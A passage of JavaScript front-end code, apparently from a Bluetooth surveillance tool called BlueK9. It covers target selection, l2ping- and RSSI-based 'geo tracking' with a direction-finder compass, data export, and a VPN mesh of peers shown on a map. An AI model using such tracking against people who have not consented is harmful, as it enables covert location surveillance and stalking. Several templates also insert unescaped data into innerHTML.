        setTimeout(() => window.map.resize(), 100);
    }

    savePanelLayout();
}

/**
 * Load panel layout from local storage
 */
function loadPanelLayout() {
    const saved = localStorage.getItem('bluek9_panel_layout');
    if (saved) {
        try {
            panelLayout = { ...panelLayout, ...JSON.parse(saved) };

            const leftPanel = document.getElementById('panelLeft');
            const rightPanel = document.getElementById('panelRight');

            if (panelLayout.leftCollapsed && leftPanel) {
                leftPanel.classList.add('collapsed');
                const btn = leftPanel.querySelector('.collapse-btn');
                if (btn) btn.innerHTML = '+';
            }

            if (panelLayout.rightCollapsed && rightPanel) {
                rightPanel.classList.add('collapsed');
                const btn = rightPanel.querySelector('.collapse-btn');
                if (btn) btn.innerHTML = '+';
            }

            if (panelLayout.leftPanel === 'right') {
                swapPanels();
            }

            // Apply bottom dock if saved
            if (panelLayout.rightDock === 'bottom') {
                // Need to toggle from default 'right' to 'bottom'
                panelLayout.rightDock = 'right'; // Reset so toggle works
                toggleBottomDock();
            }
        } catch (e) {
            console.error('Failed to load panel layout:', e);
        }
    }
}

// ==================== EXPORT FUNCTIONS ====================

/**
 * Export collection data for offline analysis
 */
function exportCollection(format = 'json') {
    addLogEntry(`Exporting collection data as ${format.toUpperCase()}...`, 'INFO');

    fetch(`/api/logs/export?format=${format}`, {
        method: 'GET',
        credentials: 'include'  // Include session cookies
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`Export failed: ${response.status}`);
        }
        // Get filename from Content-Disposition header if available
        const contentDisposition = response.headers.get('Content-Disposition');
        let filename = `bluek9_collection_${new Date().toISOString().slice(0,19).replace(/[:.]/g, '-')}.${format}`;
        if (contentDisposition) {
            const match = contentDisposition.match(/filename=([^;]+)/);
            if (match) filename = match[1].replace(/"/g, '');
        }
        return response.blob().then(blob => ({ blob, filename }));
    })
    .then(({ blob, filename }) => {
        // Create object URL and trigger download
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();

        // Cleanup
        setTimeout(() => {
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        }, 100);

        addLogEntry(`Collection exported: ${filename}`, 'INFO');
    })
    .catch(error => {
        addLogEntry(`Export failed: ${error.message}`, 'ERROR');
        console.error('Export error:', error);
    });
}

// ==================== ACTIVE GEO TRACKING ====================

// Track which devices have active geo sessions
const activeGeoSessions = new Set();

/**
 * Toggle active geo tracking for a device
 */
function toggleActiveGeo(bdAddress) {
    if (activeGeoSessions.has(bdAddress)) {
        stopActiveGeo(bdAddress);
    } else {
        startActiveGeo(bdAddress);
    }
}

/**
 * Start active geo tracking with continuous l2ping
 */
function startActiveGeo(bdAddress) {
    fetch(`/api/device/${bdAddress}/geo/track`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started' || data.status === 'already_running') {
            activeGeoSessions.add(bdAddress);
            updateGeoButtonState(bdAddress, true);
            addLogEntry(`Active geo tracking started for ${bdAddress}`, 'INFO');
            // Track in operations bar
            addOperation(`geo-${bdAddress}`, 'GEO', 'Tracking', {
                bdAddress,
                cancellable: true,
                cancelFn: () => stopActiveGeo(bdAddress)
            });
        }
    })
    .catch(e => addLogEntry(`Failed to start geo tracking: ${e}`, 'ERROR'));
}

/**
 * Stop active geo tracking
 */
function stopActiveGeo(bdAddress) {
    fetch(`/api/device/${bdAddress}/geo/stop`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
    })
    .then(r => r.json())
    .then(data => {
        activeGeoSessions.delete(bdAddress);
        updateGeoButtonState(bdAddress, false);
        addLogEntry(`Active geo tracking stopped for ${bdAddress}`, 'INFO');
        // Remove from operations bar
        removeOperation(`geo-${bdAddress}`);
    })
    .catch(e => addLogEntry(`Failed to stop geo tracking: ${e}`, 'ERROR'));
}

/**
 * Update geo button visual state
 */
function updateGeoButtonState(bdAddress, active) {
    const btn = document.querySelector(`.geo-btn[data-bd="${bdAddress}"]`);
    if (btn) {
        btn.classList.toggle('active', active);
        btn.title = active ? 'Stop Tracking' : 'Track Location';
    }

    // Update communication visual
    if (active) {
        showCommLine(bdAddress);
    } else {
        hideCommLine(bdAddress);
    }
}

function showCommLine(bdAddress) {
    const device = devices[bdAddress];
    if (!device || !device.emitter_lat || !device.emitter_lon) return;
    if (!systemMarker) return;

    const systemPos = systemMarker.getLngLat();
    const devicePos = [device.emitter_lon, device.emitter_lat];
    const sourceId = `comm-line-${bdAddress}`;

    // Create line data
    const lineData = {
        type: 'Feature',
        geometry: {
            type: 'LineString',
            coordinates: [
                [systemPos.lng, systemPos.lat],
                devicePos
            ]
        }
    };

    // Add or update source
    if (map.getSource(sourceId)) {
        map.getSource(sourceId).setData(lineData);
    } else {
        map.addSource(sourceId, {
            type: 'geojson',
            data: lineData
        });

        // Add animated dashed line layer
        map.addLayer({
            id: `${sourceId}-glow`,
            type: 'line',
            source: sourceId,
            paint: {
                'line-color': '#ff3b30',
                'line-width': 4,
                'line-blur': 3,
                'line-opacity': 0.5
            }
        });

        map.addLayer({
            id: `${sourceId}-line`,
            type: 'line',
            source: sourceId,
            paint: {
                'line-color': '#ff3b30',
                'line-width': 2,
                'line-dasharray': [2, 2]
            }
        });

        commLines[bdAddress] = sourceId;
    }
}

function hideCommLine(bdAddress) {
    const sourceId = `comm-line-${bdAddress}`;

    if (map.getLayer(`${sourceId}-line`)) {
        map.removeLayer(`${sourceId}-line`);
    }
    if (map.getLayer(`${sourceId}-glow`)) {
        map.removeLayer(`${sourceId}-glow`);
    }
    if (map.getSource(sourceId)) {
        map.removeSource(sourceId);
    }
    delete commLines[bdAddress];
}

function updateCommLines() {
    // Update all active comm lines with current positions
    Object.keys(commLines).forEach(bdAddress => {
        const device = devices[bdAddress];
        if (!device || !device.emitter_lat || !device.emitter_lon) return;
        if (!systemMarker) return;

        const systemPos = systemMarker.getLngLat();
        const sourceId = commLines[bdAddress];

        if (map.getSource(sourceId)) {
            map.getSource(sourceId).setData({
                type: 'Feature',
                geometry: {
                    type: 'LineString',
                    coordinates: [
                        [systemPos.lng, systemPos.lat],
                        [device.emitter_lon, device.emitter_lat]
                    ]
                }
            });
        }
    });
}

/**
 * Handle geo ping events from server
 */

function handleGeoPing(data) {
    // Update device RSSI in real-time
    if (data.rssi && devices[data.bd_address]) {
        devices[data.bd_address].rssi = data.rssi;
    }

    // Update tracking stats panel if this is the manual tracking target
    if (data.bd_address === manualTrackingBd) {
        updateTrackingStats(data);

        // Show direction finder when tracking (even without full direction data)
        const finder = document.getElementById('directionFinder');
        if (finder) {
            finder.classList.remove('hidden');

            // Update direction finder with data if available
            if (data.direction) {
                updateDirectionFinder(data.direction);
            } else {
                // Show waiting message when no direction data yet
                const trendEl = document.getElementById('directionTrend');
                const bearingEl = document.getElementById('directionBearing');
                const confEl = document.getElementById('directionConfidence');

                if (trendEl) {
                    trendEl.textContent = data.rssi ? 'ACQUIRING SIGNAL' : 'SEARCHING...';
                    trendEl.className = 'direction-trend';
                }
                if (bearingEl) {
                    bearingEl.textContent = 'Move with GPS to calculate bearing';
                }
                if (confEl) {
                    confEl.textContent = data.rssi ? `RSSI: ${data.rssi} dBm` : 'Waiting for response...';
                }
            }
        }
    }

    // Show ping status in log (throttled)
    if (data.ping % 5 === 0 || data.status === 'timeout' || data.status === 'error') {
        const methods = data.methods ? `[${data.methods.join('+')}]` : '';
        const status = data.status === 'timeout' ? 'TIMEOUT' :
            data.status === 'error' ? `ERROR: ${data.error}` :
            `RSSI:${data.rssi || '--'}dBm RTT:${data.rtt || '--'}ms`;
        addLogEntry(`GEO ${methods} ${data.bd_address}: ${status}`, 'DEBUG');
    }
}

/**
 * Update direction finder UI with bearing and trend info
 */
function updateDirectionFinder(direction) {
    const finder = document.getElementById('directionFinder');
    const arrow = document.getElementById('compassArrow');
    const trendEl = document.getElementById('directionTrend');
    const bearingEl = document.getElementById('directionBearing');
    const confEl = document.getElementById('directionConfidence');

    if (!finder) return;

    // Show the direction finder
    finder.classList.remove('hidden');

    // Update trend class for styling
    finder.classList.remove('closer', 'farther', 'stable');
    if (direction.trend) {
        finder.classList.add(direction.trend);
    }

    // Update trend text
    if (trendEl) {
        if (direction.trend === 'closer') {
            trendEl.textContent = 'GETTING CLOSER';
            trendEl.className = 'direction-trend closer';
        } else if (direction.trend === 'farther') {
            trendEl.textContent = 'MOVING AWAY';
            trendEl.className = 'direction-trend farther';
        } else if (direction.trend === 'stable') {
            trendEl.textContent = 'SIGNAL STABLE';
            trendEl.className = 'direction-trend stable';
        } else {
            trendEl.textContent = direction.message || 'MOVE TO FIND';
            trendEl.className = 'direction-trend';
        }
    }

    // Update bearing display and rotate arrow
    if (bearingEl) {
        if (direction.bearing !== null && direction.bearing !== undefined) {
            const cardinalDir = getCardinalDirection(direction.bearing);
            bearingEl.textContent = `${Math.round(direction.bearing)}° ${cardinalDir}`;

            // Rotate the compass arrow
            if (arrow) {
                arrow.style.transform = `translate(-50%, -50%) rotate(${direction.bearing}deg)`;
            }
        } else {
            bearingEl.textContent = 'Move around to determine direction';
            if (arrow) {
                arrow.style.transform = 'translate(-50%, -50%) rotate(0deg)';
            }
        }
    }

    // Update confidence
    if (confEl) {
        if (direction.confidence > 0) {
            confEl.textContent = `Confidence: ${direction.confidence}%`;
            if (direction.rssi_delta) {
                confEl.textContent += ` | RSSI Δ: ${direction.rssi_delta > 0 ? '+' : ''}${direction.rssi_delta}dB`;
            }
        } else {
            confEl.textContent = 'Confidence: --';
        }
    }
}

/**
 * Get cardinal direction from bearing
 */
function getCardinalDirection(bearing) {
    const directions = ['N', 'NNE', 'NE', 'ENE', 'E', 'ESE', 'SE', 'SSE', 'S', 'SSW', 'SW', 'WSW', 'W', 'WNW', 'NW', 'NNW'];
    const index = Math.round(bearing / 22.5) % 16;
    return directions[index];
}

/**
 * Hide direction finder when tracking stops
 */
function hideDirectionFinder() {
    const finder = document.getElementById('directionFinder');
    if (finder) {
        finder.classList.add('hidden');
        finder.classList.remove('closer', 'farther', 'stable');
    }
}

/**
 * Get color for RSSI value (red=strong, blue=weak)
 * RSSI typically ranges from -30 (very strong) to -100 (very weak)
 */
function getRssiColor(rssi) {
    if (rssi === null || rssi === undefined || rssi === '--') {
        return '#8b949e'; // Default gray
    }

    // Clamp RSSI between -100 and -30
    const clampedRssi = Math.max(-100, Math.min(-30, rssi));

    // Normalize to 0-1 range (0 = weak/-100, 1 = strong/-30)
    const normalized = (clampedRssi + 100) / 70;

    // Interpolate from blue (weak) to red (strong)
    // Blue: rgb(59, 130, 246)  -> Red: rgb(239, 68, 68)
    const r = Math.round(59 + (239 - 59) * normalized);
    const g = Math.round(130 + (68 - 130) * normalized);
    const b = Math.round(246 + (68 - 246) * normalized);

    return `rgb(${r}, ${g}, ${b})`;
}

/**
 * Update tracking stats display
 */
function updateTrackingStats(data) {
    const statsEl = document.getElementById('trackingStats');
    if (!statsEl) return;

    const rssiColor = getRssiColor(data.rssi);
    const rssiValue = data.rssi !== null && data.rssi !== undefined ? data.rssi : '--';

    statsEl.innerHTML = `
        <div class="stats-grid">
            <div class="stat-item rssi-highlight">
                <span class="stat-label">RSSI</span>
                <span class="stat-value rssi-value" style="color: ${rssiColor}; font-size: 18px; font-weight: bold;">${rssiValue} dBm</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">RTT</span>
                <span class="stat-value">${data.rtt ? data.rtt.toFixed(1) : '--'} ms</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">AVG RTT</span>
                <span class="stat-value">${data.avg_rtt || '--'} ms</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">PINGS</span>
                <span class="stat-value">${data.ping || 0}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">READINGS</span>
                <span class="stat-value">${data.rssi_readings || 0}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">SUCCESS</span>
                <span class="stat-value">${data.success_rate || 0}%</span>
            </div>
        </div>
    `;
}

/**
 * Refresh target list in dropdown
 */
function refreshTargetList() {
    fetch('/api/targets')
        .then(r => r.json())
        .then(targets => {
            const select = document.getElementById('trackTargetSelect');
            const currentValue = select.value;

            // Clear existing options except the placeholder
            select.innerHTML = '<option value="">-- Select Target --</option>';

            // Add targets
            targets.forEach(target => {
                const option = document.createElement('option');
                option.value = target.bd_address;
                const device = devices[target.bd_address];
                // Use device name, then target alias, then 'Unknown'
                const name = device?.device_name || target.alias || 'Unknown';
                option.textContent = `${target.bd_address} (${name})`;
                select.appendChild(option);
            });

            // Restore selection if still valid
            if (currentValue && targets.some(t => t.bd_address === currentValue)) {
                select.value = currentValue;
            }

            if (targets.length === 0) {
                addLogEntry('No targets defined. Add targets first.', 'WARNING');
            }
        })
        .catch(e => addLogEntry(`Failed to load targets: ${e}`, 'ERROR'));
}

/**
 * Start target tracking from the panel
 */
function startTargetTracking() {
    const select = document.getElementById('trackTargetSelect');
    const bdAddress = select.value;

    if (!bdAddress) {
        addLogEntry('Select a target to track', 'ERROR');
        return;
    }

    // Get selected methods
    const methods = [];
    if (document.getElementById('methodL2ping').checked) methods.push('l2ping');
    if (document.getElementById('methodRssi').checked) methods.push('rssi');

    if (methods.length === 0) {
        addLogEntry('Select at least one tracking method', 'ERROR');
        return;
    }

    manualTrackingBd = bdAddress;

    fetch(`/api/device/${bdAddress}/geo/track`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ methods: methods })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started' || data.status === 'already_running') {
            activeGeoSessions.add(bdAddress);
            document.getElementById('btnStartTrack').disabled = true;
            document.getElementById('btnStopTrack').disabled = false;
            document.getElementById('trackTargetSelect').disabled = true;
            document.getElementById('trackingStatus').textContent = 'ACTIVE';
            document.getElementById('trackingStatus').className = 'tracking-status active';
            addLogEntry(`Target tracking started for ${bdAddress} (${methods.join('+')})`, 'INFO');
        }
    })
    .catch(e => addLogEntry(`Failed to start tracking: ${e}`, 'ERROR'));
}

/**
 * Stop target tracking
 */
function stopTargetTracking() {
    if (!manualTrackingBd) return;

    fetch(`/api/device/${manualTrackingBd}/geo/stop`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
    })
    .then(r => r.json())
    .then(data => {
        activeGeoSessions.delete(manualTrackingBd);
        document.getElementById('btnStartTrack').disabled = false;
        document.getElementById('btnStopTrack').disabled = true;
        document.getElementById('trackTargetSelect').disabled = false;
        document.getElementById('trackingStatus').textContent = 'STOPPED';
        document.getElementById('trackingStatus').className = 'tracking-status';
        hideDirectionFinder();  // Hide direction compass when stopping
        addLogEntry(`Target tracking stopped for ${manualTrackingBd}`, 'INFO');
        manualTrackingBd = null;
    })
    .catch(e => addLogEntry(`Failed to stop tracking: ${e}`, 'ERROR'));
}

// ==================== WARHAMMER NETWORK FUNCTIONS ====================

// Network state
let networkRunning = false;
let networkPeers = [];
let networkRoutes = [];
let peerLocations = {};
let peerMarkers = {};
let connectionLines = {};
let showPeerLocations = true;
let showPeerConnections = true;

/**
 * Start WARHAMMER network monitoring
 */
function startNetworkMonitor() {
    fetch('/api/network/monitor/start', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'started' || data.status === 'already_running') {
                networkRunning = true;
                updateNetworkUI();
                addLogEntry('WARHAMMER network connected', 'INFO');
                // Start cellular monitoring too
                startCellularMonitor();
            }
        })
        .catch(e => addLogEntry(`Network connect failed: ${e}`, 'ERROR'));
}

/**
 * Stop WARHAMMER network monitoring
 */
function stopNetworkMonitor() {
    fetch('/api/network/monitor/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            networkRunning = false;
            updateNetworkUI();
            clearPeerMarkers();
            addLogEntry('WARHAMMER network disconnected', 'INFO');
        })
        .catch(e => addLogEntry(`Network disconnect failed: ${e}`, 'ERROR'));
}

/**
 * Update network UI elements
 */
function updateNetworkUI() {
    const startBtn = document.getElementById('btnStartNetwork');
    const stopBtn = document.getElementById('btnStopNetwork');
    const badge = document.getElementById('networkStatusBadge');

    if (startBtn) startBtn.disabled = networkRunning;
    if (stopBtn) stopBtn.disabled = !networkRunning;

    if (badge) {
        badge.textContent = networkRunning ? 'ONLINE' : 'OFFLINE';
        badge.className = `network-status-badge ${networkRunning ? 'online' : ''}`;
    }
}

/**
 * Update network data from WebSocket event
 */
function handleWarhammerUpdate(data) {
    if (data.peers) {
        networkPeers = data.peers;
        updatePeerList();
        document.getElementById('networkPeerCount').textContent = networkPeers.length;
        document.getElementById('networkOnlineCount').textContent =
            networkPeers.filter(p => p.connected).length;

        // Update BlueK9 peer count
        const bluek9Count = data.bluek9_count !== undefined ?
            data.bluek9_count : networkPeers.filter(p => p.is_bluek9).length;
        const bluek9El = document.getElementById('networkBluek9Count');
        if (bluek9El) bluek9El.textContent = bluek9Count;
    }

    if (data.peer_locations) {
        data.peer_locations.forEach(loc => {
            peerLocations[loc.system_id] = loc;
        });
        if (showPeerLocations) {
            updatePeerMarkers();
        }
    }

    if (data.routes) {
        networkRoutes = data.routes;
        updateRouteList();
        document.getElementById('networkRouteCount').textContent = networkRoutes.length;
    }

}

// Peer filter state
let peerFilter = 'all';  // 'all' or 'bluek9'

/**
 * Set peer filter and update list
 */
function setPeerFilter(filter) {
    peerFilter = filter;

    // Update button active states
    document.getElementById('filterAllPeers').classList.toggle('active', filter === 'all');
    document.getElementById('filterBk9Peers').classList.toggle('active', filter === 'bluek9');

    // Refresh the list
    updatePeerList();
}

/**
 * Truncate hostname - remove common suffixes like .netbird.selfhosted
 */
function truncateHostname(hostname) {
    if (!hostname) return hostname;
    // Remove common NetBird and VPN suffixes
    return hostname
        .replace(/\.netbird\.selfhosted$/i, '')
        .replace(/\.netbird\.cloud$/i, '')
        .replace(/\.netbird$/i, '')
        .replace(/\.local$/i, '');
}

/**
 * Update the peer list in the UI
 */
function updatePeerList() {
    const container = document.getElementById('peerListContainer');
    if (!container) return;

    // Filter peers based on current filter
    let filteredPeers = networkPeers;
    if (peerFilter === 'bluek9') {
        filteredPeers = networkPeers.filter(p => p.is_bluek9);
    }

    if (filteredPeers.length === 0) {
        const msg = peerFilter === 'bluek9' ? 'No BlueK9 peers connected' : 'No peers connected';
        container.innerHTML = `<div class="peer-item"><span class="peer-name" style="color: var(--text-muted);">${msg}</span></div>`;
        return;
    }

    // Sort: BlueK9 peers first, then by connection status, then by name
    const sortedPeers = [...filteredPeers].sort((a, b) => {
        if (a.is_bluek9 !== b.is_bluek9) return b.is_bluek9 ? 1 : -1;
        if (a.connected !== b.connected) return b.connected ? 1 : -1;
        return (a.hostname || a.name || '').localeCompare(b.hostname || b.name || '');
    });

    container.innerHTML = sortedPeers.map(peer => {
        // Get display name and truncate hostname suffixes
        let displayName = peer.is_bluek9 ? (peer.system_name || peer.system_id || peer.hostname) : (peer.hostname || peer.name);
        displayName = truncateHostname(displayName);

        const peerType = peer.is_bluek9 ? 'bluek9' : 'network';
        const peerBadge = peer.is_bluek9 ? '<span class="peer-bluek9-badge">BK9</span>' : '';
        const latencyInfo = peer.latency ? `<span class="peer-latency">${peer.latency}</span>` : '';
        const connType = peer.connection_type ? `<span class="peer-conn-type">${peer.connection_type}</span>` : '';

        return `
            <div class="peer-item ${peerType}" onclick="locatePeer('${peer.id}')" data-peer-ip="${peer.ip}">
                <div class="peer-status-dot ${peer.connected ? 'online' : 'offline'} ${peer.is_bluek9 ? 'bluek9' : ''}"></div>
                <div class="peer-info">
                    <div class="peer-name">
                        ${displayName}
                        ${peerBadge}
                    </div>
                    <div class="peer-details">
                        <span class="peer-ip">${peer.ip}</span>
                        ${latencyInfo}
                        ${connType}
                    </div>
                </div>
                ${peer.is_bluek9 ? `<button class="peer-locate-btn" onclick="event.stopPropagation(); locatePeer('${peer.id}')" title="Locate on map">&#128205;</button>` : ''}
            </div>
        `;
    }).join('');
}

/**
 * Update the route list in the UI
 */
function updateRouteList() {
    const container = document.getElementById('routeListContainer');
    if (!container) return;

    if (networkRoutes.length === 0) {
        container.innerHTML = '<div class="route-item"><span class="route-network" style="color: var(--text-muted);">No routes configured</span></div>';
        return;
    }

    container.innerHTML = networkRoutes.map(route => `
        <div class="route-item ${route.persistent ? 'persistent' : ''} ${!route.enabled ? 'disabled' : ''}">
            <div class="route-info">
                <div class="route-network">
                    ${route.network}
                    ${route.persistent ? '<span class="route-persistent-badge">PERSISTENT</span>' : ''}
                </div>
                <div class="route-desc">${route.description || 'No description'}</div>
            </div>
            <div class="route-actions">
                <button class="route-action-btn" onclick="toggleRoute('${route.id}')"
                    ${route.persistent ? 'disabled' : ''} title="${route.enabled ? 'Disable' : 'Enable'}">
                    ${route.enabled ? '&#10004;' : '&#10006;'}
                </button>
                <button class="route-action-btn delete" onclick="deleteRoute('${route.id}')"
                    ${route.persistent ? 'disabled' : ''} title="Delete">
                    &#128465;
                </button>
            </div>
        </div>
    `).join('');
}

/**
 * Locate a peer on the map
 */
function locatePeer(peerId) {
    const peer = networkPeers.find(p => p.id === peerId);
    if (!peer) return;

    // Find peer location
    const peerLoc = Object.values(peerLocations).find(loc =>
        loc.system_id === peer.hostname || loc.system_name === peer.name
    );

    if (peerLoc && peerLoc.lat && peerLoc.lon) {
        map.flyTo({
            center: [peerLoc.lon, peerLoc.lat],
            zoom: 14,
            duration: 1500
        });
        addLogEntry(`Located peer: ${peer.hostname}`, 'INFO');
    } else {
        addLogEntry(`No location data for peer: ${peer.hostname}`, 'WARNING');
    }
}

/**
 * Toggle a route enabled/disabled
 */
function toggleRoute(routeId) {
    fetch(`/api/network/routes/${routeId}/toggle`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.error) {
                addLogEntry(`Route toggle failed: ${data.error}`, 'ERROR');
            } else {
                addLogEntry(`Route ${data.enabled ? 'enabled' : 'disabled'}`, 'INFO');
                refreshNetworkRoutes();
            }
        })
        .catch(e => addLogEntry(`Route toggle failed: ${e}`, 'ERROR'));
}

/**
 * Delete a route
 */
function deleteRoute(routeId) {
    if (!confirm('Delete this route?')) return;

    fetch(`/api/network/routes/${routeId}`, { method: 'DELETE' })
        .then(r => r.json())
        .then(data => {
            if (data.error) {
                addLogEntry(`Route delete failed: ${data.error}`, 'ERROR');
            } else {
                addLogEntry('Route deleted', 'INFO');
                refreshNetworkRoutes();
            }
        })
        .catch(e => addLogEntry(`Route delete failed: ${e}`, 'ERROR'));
}

/**
 * Refresh network routes
 */
function refreshNetworkRoutes() {
    fetch('/api/network/routes')
        .then(r => r.json())
        .then(data => {
            networkRoutes = data.routes || [];
            updateRouteList();
        });
}

/**
 * Open add route modal
 */
function openAddRouteModal() {
    // Populate peer select
    const peerSelect = document.getElementById('routePeer');
    peerSelect.innerHTML = '<option value="">-- Select Peer --</option>';
    networkPeers.forEach(peer => {
        peerSelect.innerHTML += `<option value="${peer.id}">${peer.hostname || peer.name}</option>`;
    });

    document.getElementById('addRouteModal').classList.remove('hidden');
}

/**
 * Close add route modal
 */
function closeAddRouteModal() {
    document.getElementById('addRouteModal').classList.add('hidden');
}

/**
 * Submit add route form
 */
function submitAddRoute() {
    const network = document.getElementById('routeNetwork').value;
    const description = document.getElementById('routeDescription').value;
    const peer = document.getElementById('routePeer').value;
    const metric = parseInt(document.getElementById('routeMetric').value) || 9999;
    const masquerade = document.getElementById('routeMasquerade').checked;

    if (!network) {
        addLogEntry('Network CIDR is required', 'WARNING');
        return;
    }

    fetch('/api/network/routes', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ network, description, peer, metric, masquerade })
    })
    .then(r => r.json())
    .then(data => {
        if (data.error) {
            addLogEntry(`Add route failed: ${data.error}`, 'ERROR');
        } else {
            addLogEntry(`Route added: ${network}`, 'INFO');
            closeAddRouteModal();
            refreshNetworkRoutes();
        }
    })
    .catch(e => addLogEntry(`Add route failed: ${e}`, 'ERROR'));
}

/**
 * Toggle peer location visibility
 */
function toggleShowPeers() {
    showPeerLocations = document.getElementById('toggleShowPeers').checked;
    if (showPeerLocations) {
        updatePeerMarkers();
    } else {
        clearPeerMarkers();
    }
}

/**
 * Toggle connection line visibility
 */
function toggleShowConnections() {
    showPeerConnections = document.getElementById('toggleShowConnections').checked;
    if (showPeerConnections) {
        updateConnectionLines();
    } else {
        clearConnectionLines();
    }
}

/**
 * Update peer markers on map
 */
function updatePeerMarkers() {
    if (!map || !showPeerLocations) return;

    // Track which markers we've seen in this update
    const seenMarkers = new Set();

    Object.values(peerLocations).forEach(loc => {
        if (!loc.lat || !loc.lon) return;

        const markerId = `peer-${loc.system_id}`;
        seenMarkers.add(markerId);

        // Check if marker already exists at this location
        if (peerMarkers[markerId]) {
            const existingMarker = peerMarkers[markerId];
            const existingLngLat = existingMarker.getLngLat();

            // Only update if position has changed significantly (avoid unnecessary updates)
            if (Math.abs(existingLngLat.lng - loc.lon) < 0.00001 &&
                Math.abs(existingLngLat.lat - loc.lat) < 0.00001) {
                return; // Position unchanged, skip update
            }

            // Update existing marker position instead of recreating
            existingMarker.setLngLat([loc.lon, loc.lat]);
            return;
        }

        // Create new marker element only if marker doesn't exist
        const el = document.createElement('div');
        el.className = 'peer-marker';

        // Check if this is our system
        const isSelf = loc.system_id === localStorage.getItem('bluek9_system_id');
        if (isSelf) el.classList.add('self');

        el.innerHTML = `
            <div class="peer-marker-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
                </svg>
            </div>
            <div class="peer-marker-label">${loc.system_name || loc.system_id}</div>
        `;

        // Create and add marker
        const marker = new mapboxgl.Marker({ element: el })
            .setLngLat([loc.lon, loc.lat])
            .addTo(map);

        peerMarkers[markerId] = marker;
    });

    // Remove markers for peers that are no longer in peerLocations
    Object.keys(peerMarkers).forEach(markerId => {
        if (!seenMarkers.has(markerId)) {
            peerMarkers[markerId].remove();
            delete peerMarkers[markerId];
        }
    });

    if (showPeerConnections) {
        updateConnectionLines();
    }
}

/**
 * Clear all peer markers
 */
function clearPeerMarkers() {
    Object.values(peerMarkers).forEach(marker => marker.remove());
    peerMarkers = {};
    clearConnectionLines();
}

/**
 * Update connection lines between peers
 */
function updateConnectionLines() {
    // Connection lines would require SVG overlay
    // For now, we'll skip this as it's complex with Mapbox
}

/**
 * Clear connection lines
 */
function clearConnectionLines() {
    Object.keys(connectionLines).forEach(id => {
        if (map.getLayer(id)) map.removeLayer(id);
        if (map.getSource(id)) map.removeSource(id);
    });
    connectionLines = {};
}

/**
 * Refresh network settings panel
 */
function refreshNetworkSettings() {
    fetch('/api/network/status')
        .then(r => r.json())
        .then(data => {
            document.getElementById('settingsNetworkName').textContent = data.network_name || 'WARHAMMER';
            document.getElementById('settingsNetworkStatus').textContent = data.running ? 'CONNECTED' : 'DISCONNECTED';
            document.getElementById('settingsNetworkPeers').textContent = `${data.connected_peers || 0} / ${data.peer_count || 0}`;
            document.getElementById('settingsNetworkRoutes').textContent = data.route_count || '0';

            // Also update new fields if they exist
            const bk9El = document.getElementById('settingsNetworkBk9');
            if (bk9El) bk9El.textContent = data.bluek9_count || '0';
        });
}

// Settings Network Tab state
let settingsPeerFilter = 'all';
let settingsSpeedtestChart = null;

/**
 * Refresh the Settings Network tab with current data
 */
function refreshSettingsNetworkTab() {
    refreshNetworkSettings();
    refreshSettingsSpeedtestPeers();
    updateSettingsPeerList();
}

/**
 * Update peer list in settings tab
 */
function updateSettingsPeerList() {
    const container = document.getElementById('settingsPeerList');
    if (!container) return;

    let filteredPeers = networkPeers;
    if (settingsPeerFilter === 'bluek9') {
        filteredPeers = networkPeers.filter(p => p.is_bluek9);
    }

    if (filteredPeers.length === 0) {
        const msg = settingsPeerFilter === 'bluek9' ? 'No BlueK9 peers connected' : 'No peers connected';
        container.innerHTML = `<div class="settings-peer-item empty">${msg}</div>`;
        return;
    }

    // Sort: BlueK9 first, then connected, then by name
    const sortedPeers = [...filteredPeers].sort((a, b) => {
        if (a.is_bluek9 !== b.is_bluek9) return b.is_bluek9 ? 1 : -1;
        if (a.connected !== b.connected) return b.connected ? 1 : -1;
        return (a.hostname || '').localeCompare(b.hostname || '');
    });

    container.innerHTML = sortedPeers.map(peer => {
        const name = truncateHostname(peer.is_bluek9 ? (peer.system_name || peer.hostname) : peer.hostname);
        const badge = peer.is_bluek9 ? '<span class="peer-bluek9-badge">BK9</span>' : '';
        const status = peer.connected ? 'online' : 'offline';
        const latency = peer.latency || '--';

        return `
            <div class="settings-peer-item">
                <div class="peer-status-dot ${status} ${peer.is_bluek9 ? 'bluek9' : ''}"></div>
                <div class="settings-peer-info">
                    <div class="settings-peer-name">${name} ${badge}</div>
                    <div class="settings-peer-details">
                        <span>${peer.ip}</span>
                        <span>${latency}</span>
                        <span>${peer.connection_type || ''}</span>
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

/**
 * Set peer filter in settings
 */
function setSettingsPeerFilter(filter) {
    settingsPeerFilter = filter;
    document.getElementById('settingsFilterAll').classList.toggle('active', filter === 'all');
    document.getElementById('settingsFilterBk9').classList.toggle('active', filter === 'bluek9');
    updateSettingsPeerList();
}

/**
 * Refresh speedtest peers dropdown in settings
 */
async function refreshSettingsSpeedtestPeers() {
    const select = document.getElementById('settingsSpeedtestPeer');
    if (!select) return;

    try {
        const response = await fetch('/api/network/speedtest/peers');
        if (!response.ok) return;

        const data = await response.json();
        const peers = data.peers || [];

        select.innerHTML = '<option value="">Select target node...</option>';
